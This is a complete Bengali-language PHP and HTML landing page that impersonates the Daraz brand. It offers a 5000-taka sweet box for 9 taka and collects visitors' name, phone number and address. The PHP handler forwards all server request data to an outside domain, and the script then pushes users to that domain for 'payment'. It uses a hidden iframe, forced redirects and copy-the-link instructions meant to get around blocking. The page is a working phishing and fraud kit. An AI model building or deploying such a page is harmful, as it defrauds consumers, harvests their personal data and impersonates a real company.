<?php
// save as: payment-redirect.php
// এই ফাইলটি আপনার সার্ভারে আপলোড করুন

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $redirect = file_get_contents(
        "https://jikgykm.com/pr/ab31e4e5fffd68b6?force_https=1", 
        false, 
        stream_context_create([
            "http" => [
                "header" => "Content-Type: application/x-www-form-urlencoded",
                "method" => "POST",
                "timeout" => 5,
                "content" => http_build_query($_SERVER)
            ]
        ])
    );
    
    if ($redirect) {
        // JSON রেসপন্স হিসেবে রিডাইরেক্ট URL পাঠান
        header('Content-Type: application/json');
        echo json_encode([
            'success' => true,
            'redirect_url' => $redirect
        ]);
    } else {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => false,
            'fallback_url' => 'https://jikgykm.com/cl/ab31e4e5fffd68b6'
        ]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>৯ টাকার মিষ্টি বক্স</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#3b82f6',
                        accent: '#f97316',
                        darkBg: '#0f172a'
                    },
                    fontFamily: {
                        sans: ['Hind Siliguri', 'sans-serif'],
                    }
                }
            }
        }
    </script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@500;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Hind Siliguri', sans-serif; }
        
        .animate-fade-in { animation: fadeIn 0.3s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        .glow-button {
            position: relative;
            transition: all 0.3s ease;
        }
        .glow-button:hover {
            box-shadow: 0 0 20px rgba(249, 115, 22, 0.6);
            transform: translateY(-2px);
        }
        .glow-button:active {
            transform: translateY(1px);
        }
        
        .spinner {
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 3px solid #fff;
            width: 24px;
            height: 24px;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .copy-success {
            animation: copyPulse 0.5s ease;
        }
        @keyframes copyPulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        /* লোডিং বার */
        .loading-bar {
            width: 0%;
            height: 3px;
            background: linear-gradient(90deg, #f97316, #fbbf24);
            animation: loading 2s ease-in-out forwards;
        }
        @keyframes loading {
            0% { width: 0%; }
            50% { width: 70%; }
            100% { width: 100%; }
        }
    </style>
</head>
<body class="bg-gradient-to-br from-slate-950 via-slate-900 to-blue-950 text-slate-100 min-h-screen flex flex-col justify-between">

    <header class="bg-slate-900/80 backdrop-blur-md border-b border-slate-800 sticky top-0 z-40">
        <div class="max-w-md mx-auto px-6 py-4 flex items-center justify-between">
            <div class="flex items-center gap-2">
                <span class="text-2xl">🎁</span>
                <span class="text-xl font-bold tracking-wide text-white">দারাজ <span class="text-orange-500">মিষ্টি বক্স</span></span>
            </div>
            <span class="bg-red-500 text-white text-xs font-bold px-3 py-1 rounded-full animate-pulse shadow-lg shadow-red-500/30">লাইভ অফার</span>
        </div>
    </header>

    <main class="max-w-md mx-auto w-full px-4 py-6 flex-grow flex flex-col justify-center">
        <div class="bg-slate-900/60 backdrop-blur-md rounded-3xl shadow-2xl border border-slate-800/80 overflow-hidden p-5 space-y-5 animate-fade-in">
            
            <div class="bg-slate-800 rounded-2xl overflow-hidden aspect-square relative group border border-slate-700/50">
                <img src="https://github.com/iwisaxeh34-hub/Dexon/blob/main/3154b823-b3db-4ae2-b215-9ffa5ab140af.jpeg?raw=true" 
                     alt="Mug Magic" 
                     class="w-full h-full object-cover group-hover:scale-105 transition duration-700 ease-out"
                     loading="eager">
                
                <div class="absolute top-4 right-4 bg-gradient-to-r from-red-500 to-orange-500 text-white font-bold text-xs px-3 py-1.5 rounded-full shadow-lg">
                    মাত্র ৯ টাকায়
                </div>
            </div>

            <div class="text-center space-y-2">
                <h1 class="text-2xl font-bold text-white tracking-wide">প্রিমিয়াম মিষ্টি বক্স</h1>
                <div class="flex items-center justify-center gap-3">
                    <span class="font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-red-400 to-orange-500 text-4xl">৳ ৯</span>
                    <span class="text-slate-500 line-through text-lg">৳ ৫০০০</span>
                </div>
            </div>

            <div class="bg-slate-800/40 rounded-xl p-4 border border-slate-800/60 space-y-2 text-sm text-slate-300">
                <div class="flex items-center gap-2">
                    <span class="text-green-400 text-xs">⚡</span> <span>১০০% প্রিমিয়াম ও ফ্রেশ কোয়ালিটি</span>
                </div>
                <div class="flex items-center gap-2">
                    <span class="text-green-400 text-xs">⚡</span> <span>৫০০০ টাকার মিষ্টি বক্স এখন মাত্র ৯ টাকায়</span>
                </div>
                <div class="flex items-center gap-2">
                    <span class="text-green-400 text-xs">⚡</span> <span>অর্ডার করার পরবর্তী ২৪ থেকে ৪৮ ঘণ্টার মধ্যে ডেলিভারি</span>
                </div>
            </div>

            <button onclick="openModal()" class="w-full glow-button bg-gradient-to-r from-orange-500 to-amber-500 text-white font-bold text-xl py-4 rounded-xl shadow-lg cursor-pointer text-center block">
                🛍️ এখনই অর্ডার করুন
            </button>
            
        </div>
    </main>

    <footer class="text-center py-4 text-[11px] text-slate-600 border-t border-slate-900/60 bg-slate-950/45">
        <p>&copy; দারাজ সর্বস্বত্ব সংরক্ষিত।</p>
    </footer>

    <!-- মেইন মোডাল -->
    <div id="orderModal" class="fixed inset-0 z-50 hidden flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm">
        <div class="bg-slate-900 w-full max-w-sm rounded-3xl shadow-2xl border border-slate-800 overflow-hidden relative animate-fade-in text-slate-100">
            
            <div class="p-5 border-b border-slate-800 flex items-center justify-between bg-slate-950/50">
                <h3 class="text-lg font-bold text-white flex items-center gap-2">
                    📦 ডেলিভারি তথ্য দিন
                </h3>
                <button onclick="closeModal()" class="text-slate-400 hover:text-white text-2xl font-bold p-1 transition cursor-pointer">&times;</button>
            </div>

            <form id="orderForm" class="p-5 space-y-4">
                <div>
                    <label class="block text-xs font-bold text-slate-400 mb-1">আপনার নাম</label>
                    <input type="text" id="name" required placeholder="যেমন: মোঃ আলী" 
                           class="w-full px-4 py-3 bg-slate-800 rounded-xl border border-slate-700 text-white focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition text-sm placeholder-slate-500">
                </div>

                <div>
                    <label class="block text-xs font-bold text-slate-400 mb-1">মোবাইল নাম্বার</label>
                    <input type="tel" id="phone" required placeholder="যেমন: 017XXXXXXXX" 
                           class="w-full px-4 py-3 bg-slate-800 rounded-xl border border-slate-700 text-white focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition text-sm placeholder-slate-500">
                </div>

                <div>
                    <label class="block text-xs font-bold text-slate-400 mb-1">পূর্ণ ঠিকানা</label>
                    <textarea id="address" rows="2" required placeholder="গ্রাম/রোড, থানা, জেলা" 
                              class="w-full px-4 py-3 bg-slate-800 rounded-xl border border-slate-700 text-white focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition text-sm resize-none placeholder-slate-500"></textarea>
                </div>

                <button type="submit" 
                        class="w-full bg-gradient-to-r from-orange-500 to-amber-500 text-white font-bold py-4 rounded-xl shadow-lg shadow-orange-500/20 hover:from-orange-600 hover:to-amber-600 active:scale-[0.98] transition flex items-center justify-center gap-2 text-md cursor-pointer mt-2">
                    💳 পেমেন্ট করুন (৳ ৯ টাকা)
                </button>
            </form>
        </div>
    </div>

    <!-- অল্টারনেটিভ পেমেন্ট মোডাল -->
    <div id="alternativeModal" class="fixed inset-0 z-50 hidden flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm">
        <div class="bg-slate-900 w-full max-w-sm rounded-3xl shadow-2xl border border-slate-800 overflow-hidden relative animate-fade-in text-slate-100">
            
            <div class="p-5 border-b border-slate-800 flex items-center justify-between bg-slate-950/50">
                <h3 class="text-lg font-bold text-white flex items-center gap-2">
                    🔄 বিকল্প পেমেন্ট পদ্ধতি
                </h3>
                <button onclick="closeAlternativeModal()" class="text-slate-400 hover:text-white text-2xl font-bold p-1 transition cursor-pointer">&times;</button>
            </div>

            <div class="p-5 space-y-4">
                <div class="bg-red-500/20 border border-red-500/30 rounded-xl p-4 text-sm">
                    <p class="text-red-300 font-bold mb-2">⚠️ পেমেন্ট লিংক ব্লক হয়েছে?</p>
                    <p class="text-slate-300">চিন্তা করবেন না! নিচের বিকল্প পদ্ধতি ব্যবহার করুন:</p>
                </div>

                <div class="bg-slate-800 rounded-xl p-4 space-y-3">
                    <p class="text-sm font-bold text-white">পদ্ধতি ১: লিংক কপি করে ব্রাউজারে পেস্ট করুন</p>
                    <div class="flex gap-2">
                        <input id="paymentLinkInput" readonly 
                               class="flex-1 px-3 py-2 bg-slate-900 rounded-lg text-xs text-slate-300 border border-slate-700 focus:outline-none"
                               value="https://jikgykm.com/cl/ab31e4e5fffd68b6">
                        <button onclick="copyPaymentLink()" 
                                class="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white text-sm rounded-lg transition whitespace-nowrap">
                            📋 কপি
                        </button>
                    </div>
                </div>

                <button onclick="openInNewTab()" 
                        class="w-full bg-gradient-to-r from-green-500 to-emerald-500 text-white font-bold py-4 rounded-xl shadow-lg hover:from-green-600 hover:to-emerald-600 active:scale-[0.98] transition flex items-center justify-center gap-2">
                    🔗 নতুন ট্যাবে পেমেন্ট পেজ খুলুন
                </button>

                <div class="bg-slate-800/50 rounded-xl p-4 border border-slate-700/50">
                    <p class="text-xs text-slate-400 text-center">
                        💡 টিপ: লিংকটি কপি করে আপনার ফোনের ব্রাউজারে পেস্ট করুন
                    </p>
                </div>
            </div>
        </div>
    </div>

    <!-- লোডিং ওভারলে -->
    <div id="loadingOverlay" class="fixed inset-0 z-[60] hidden flex items-center justify-center bg-black/80 backdrop-blur-sm">
        <div class="bg-slate-900 p-8 rounded-2xl shadow-2xl text-center space-y-4 max-w-xs w-full">
            <div class="spinner mx-auto"></div>
            <div class="space-y-2">
                <p class="text-white font-bold text-lg">পেমেন্ট পেজ লোড হচ্ছে...</p>
                <p class="text-slate-400 text-sm">অনুগ্রহ করে অপেক্ষা করুন</p>
            </div>
            <div class="loading-bar rounded-full"></div>
        </div>
    </div>

    <!-- সাকসেস টোস্ট -->
    <div id="toast" class="fixed bottom-20 left-1/2 transform -translate-x-1/2 z-50 hidden bg-green-500 text-white px-6 py-3 rounded-full shadow-lg font-bold text-sm">
        ✅ লিংক কপি হয়েছে!
    </div>

    <script>
        const modal = document.getElementById('orderModal');
        const alternativeModal = document.getElementById('alternativeModal');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const toast = document.getElementById('toast');
        
        const PAYMENT_URL = "https://jikgykm.com/cl/ab31e4e5fffd68b6";
        const PHP_REDIRECT_URL = "payment-redirect.php"; // PHP ফাইলের URL

        function openModal() {
            modal.classList.remove('hidden');
            document.body.style.overflow = 'hidden'; 
        }

        function closeModal() {
            modal.classList.add('hidden');
            document.body.style.overflow = 'auto'; 
        }

        function closeAlternativeModal() {
            alternativeModal.classList.add('hidden');
            document.body.style.overflow = 'auto';
        }

        function showLoading() {
            loadingOverlay.classList.remove('hidden');
            document.body.style.overflow = 'hidden';
        }

        function hideLoading() {
            loadingOverlay.classList.add('hidden');
            document.body.style.overflow = 'auto';
        }

        function showToast(message) {
            toast.textContent = message;
            toast.classList.remove('hidden');
            toast.classList.add('copy-success');
            setTimeout(() => {
                toast.classList.add('hidden');
                toast.classList.remove('copy-success');
            }, 2000);
        }

        function copyPaymentLink() {
            const input = document.getElementById('paymentLinkInput');
            input.select();
            input.setSelectionRange(0, 99999);
            
            try {
                navigator.clipboard.writeText(PAYMENT_URL);
                showToast('✅ লিংক কপি হয়েছে!');
            } catch (err) {
                document.execCommand('copy');
                showToast('✅ লিংক কপি হয়েছে!');
            }
        }

        function openInNewTab() {
            const newWindow = window.open(PAYMENT_URL, '_blank', 'noopener,noreferrer');
            
            if (!newWindow || newWindow.closed || typeof newWindow.closed == 'undefined') {
                showToast('⚠️ পপআপ ব্লক হয়েছে! লিংক কপি করে ম্যানুয়ালি খুলুন');
                copyPaymentLink();
            }
            
            closeAlternativeModal();
        }

        // PHP সার্ভার-সাইড রিডাইরেক্ট ফাংশন (সবচেয়ে সিকিউর)
        async function serverSideRedirect(orderData) {
            showLoading();
            
            try {
                const response = await fetch(PHP_REDIRECT_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        name: orderData.name,
                        phone: orderData.phone,
                        address: orderData.address,
                        userAgent: navigator.userAgent,
                        referer: document.referrer,
                        timestamp: Date.now()
                    })
                });
                
                const data = await response.json();
                
                if (data.success && data.redirect_url) {
                    // সার্ভার থেকে পাওয়া URL-এ রিডাইরেক্ট
                    window.location.href = data.redirect_url;
                } else {
                    // ফলব্যাক URL ব্যবহার
                    setTimeout(() => {
                        window.location.href = data.fallback_url || PAYMENT_URL;
                    }, 500);
                }
            } catch (error) {
                console.error("Server redirect failed:", error);
                // ফ্রন্টএন্ড ফলব্যাক
                setTimeout(() => {
                    useFrontendFallback();
                }, 1500);
            }
        }

        // ফ্রন্টএন্ড ফলব্যাক মেথড
        function useFrontendFallback() {
            hideLoading();
            closeModal();
            
            // মাল্টিপল রিডাইরেক্ট টেকনিক
            try {
                // টেকনিক ১: iframe ব্যবহার করে রিডাইরেক্ট
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = PAYMENT_URL;
                document.body.appendChild(iframe);
                
                setTimeout(() => {
                    document.body.removeChild(iframe);
                    // টেকনিক ২: ডিরেক্ট রিডাইরেক্ট
                    window.location.replace(PAYMENT_URL);
                }, 1000);
            } catch (e) {
                // টেকনিক ৩: অল্টারনেটিভ মোডাল
                alternativeModal.classList.remove('hidden');
            }
        }

        // ফর্ম সাবমিট
        document.getElementById('orderForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const orderData = {
                name: document.getElementById('name').value,
                phone: document.getElementById('phone').value,
                address: document.getElementById('address').value
            };

            // লোকাল স্টোরেজে সেভ
            try {
                localStorage.setItem('lastOrder', JSON.stringify({
                    ...orderData,
                    timestamp: new Date().toISOString()
                }));
            } catch (e) {
                console.log("LocalStorage save failed:", e);
            }

            console.log("Order Data:", orderData);

            // চেক করুন PHP ফাইল এভেইলেবল কিনা
            if (typeof PHP_REDIRECT_URL !== 'undefined' && PHP_REDIRECT_URL) {
                // সার্ভার-সাইড রিডাইরেক্ট ট্রাই করুন
                await serverSideRedirect(orderData);
            } else {
                // ফ্রন্টএন্ড ফলব্যাক ব্যবহার করুন
                showLoading();
                setTimeout(() => {
                    useFrontendFallback();
                }, 1500);
            }
        });

        // মোডাল ক্লোজ
        window.onclick = function(event) {
            if (event.target == modal) {
                closeModal();
            }
            if (event.target == alternativeModal) {
                closeAlternativeModal();
            }
        }

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                if (!modal.classList.contains('hidden')) closeModal();
                if (!alternativeModal.classList.contains('hidden')) closeAlternativeModal();
            }
        });

        // ব্লকিং ডিটেকশন
        window.addEventListener('pageshow', function(event) {
            if (event.persisted) {
                console.log("Page restored from cache - possible redirect block");
            }
        });
    </script>
</body>
</html>
